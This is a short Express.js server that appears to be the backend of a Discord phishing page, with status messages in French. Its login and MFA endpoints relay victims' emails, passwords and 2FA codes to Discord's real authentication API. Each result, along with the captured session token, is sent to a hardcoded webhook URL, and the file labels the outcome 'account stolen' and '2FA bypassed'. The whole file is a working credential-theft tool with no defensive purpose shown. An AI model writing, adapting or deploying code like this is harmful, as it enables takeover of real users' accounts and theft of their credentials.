const express = require('express');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    const r = await axios.post('https://discord.com/api/v9/auth/login', 
      { login: email, password: password },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
          'Content-Type': 'application/json'
        }
      }
    );
    
    if (r.data.mfa) {
      await axios.post(WEBHOOK_URL, { content: `🔐 **2FA en attente**\nEmail: \`${email}\`\nPass: \`${password}\`` });
      return res.json({ mfa: true, ticket: r.data.ticket });
    }
    
    await axios.post(WEBHOOK_URL, { content: `✅ **Compte Volé !**\nEmail: \`${email}\`\nPass: \`${password}\`\n\n**TOKEN:**\n\`${r.data.token}\`` });
    return res.json({ success: true });
    
  } catch (error) {
    await axios.post(WEBHOOK_URL, { content: `❌ **Mauvais mot de passe**\nEmail: \`${email}\`\nPass: \`${password}\`` });
    return res.json({ success: false });
  }
});

app.post('/api/mfa', async (req, res) => {
  const { email, password, code, ticket } = req.body;
  
  try {
    const r = await axios.post('https://discord.com/api/v9/auth/mfa', { ticket: ticket, code: code });
    await axios.post(WEBHOOK_URL, { content: `🔥 **2FA Bypassé !**\nEmail: \`${email}\`\nCode: \`${code}\`\n\n**TOKEN:**\n\`${r.data.token}\`` });
    return res.json({ success: true });
  } catch (error) {
    return res.json({ success: false });
  }
});

app.listen(3000, () => console.log('Bench prête.'));
